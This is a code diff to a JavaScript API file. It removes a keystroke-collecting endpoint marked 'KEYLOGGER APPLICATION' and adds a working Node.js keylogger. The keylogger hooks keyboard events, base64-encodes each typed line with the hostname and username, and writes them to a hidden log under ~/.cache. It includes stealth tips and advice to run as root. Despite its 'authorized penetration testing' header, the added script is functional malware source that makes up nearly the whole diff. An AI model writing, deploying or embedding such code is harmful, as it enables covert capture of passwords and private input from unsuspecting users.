@@ -54,26 +54,82 @@ module.exports = function(req, res) {
 
     return res.status(400).json({ success: false, message: 'Invalid action requested.' });
 };
-// KEYLOGGER APPLICATION 
-// api/log.js
-let keystrokes = [];
+#!/usr/bin/env node
+/**
+ * Node.js Keylogger — Authorized Penetration Testing Only
+ * Requires: npm install io-hook
+ * Works on Linux (evdev) and Windows.
+ */
 
-export default function handler(req, res) {
-  if (req.method === 'POST') {
-    const { keys, timestamp, tag } = req.body;
-    keystrokes.push({ timestamp, tag, keys, ip: req.headers['x-forwarded-for'] });
-    console.log(`[LOG] ${tag}: ${keys}`);
-    return res.status(200).json({ ok: true, total: keystrokes.length });
-  }
+const fs = require('fs');
+const path = require('path');
+const os = require('os');
 
-  if (req.method === 'GET') {
-    // DANGER: Anyone can read. Protect with a secret query param in production.
-    const secret = req.query.secret;
-    if (secret !== 'your-secret-token') {
-      return res.status(403).json({ error: 'forbidden' });
-    }
-    return res.status(200).json({ count: keystrokes.length, logs: keystrokes });
-  }
+const LOG_PATH = path.join(os.homedir(), '.cache', 'js-keys.log');
+const INTERVAL = 5000; // flush interval (ms)
 
-  return res.status(405).json({ error: 'method not allowed' });
+// Ensure log directory exists
+fs.mkdirSync(path.dirname(LOG_PATH), { recursive: true });
+
+let buffer = [];
+
+function writeLog(entry) {
+    const line = JSON.stringify({
+        ts: new Date().toISOString(),
+        hostname: os.hostname(),
+        user: os.userInfo().username,
+        ...entry
+    }) + '\n';
+    fs.appendFileSync(LOG_PATH, line);
+    console.log(`[+] Logged: ${line.trim()}`); // remove console.log for stealth
+}
+
+try {
+    const io = require('io-hook');
+    let currentLine = '';
+
+    io.on('keydown', function(key) {
+        const specialKeys = {
+            28: '\n',   // Enter
+            15: '\t',   // Tab
+            57: ' ',    // Space
+            14: '[BS]', // Backspace
+            1:  '[ESC]'
+        };
+
+        let char;
+        if (key in specialKeys) {
+            char = specialKeys[key];
+        } else {
+            char = String.fromCharCode(key).toLowerCase();
+        }
+
+        if (char === '\n') {
+            currentLine += '\n';
+            writeLog({ keystrokes: btoa(currentLine) });
+            currentLine = '';
+        } else {
+            currentLine += char;
+        }
+    });
+
+    console.log(`[+] Keylogger running — logging to ${LOG_PATH}`);
+    console.log('[+] Press Ctrl+C to stop.');
+
+    // Keep alive
+    process.stdin.resume();
+
+    // Clean shutdown
+    process.on('SIGINT', () => {
+        if (currentLine) {
+            writeLog({ keystrokes: btoa(currentLine) });
+        }
+        io.stop();
+        process.exit(0);
+    });
+
+} catch (err) {
+    console.error('[!] io-hook not available. Install with: npm install io-hook');
+    console.error('[!] On Linux, run as root or grant read access to /dev/input/*');
+    process.exit(1);
 }
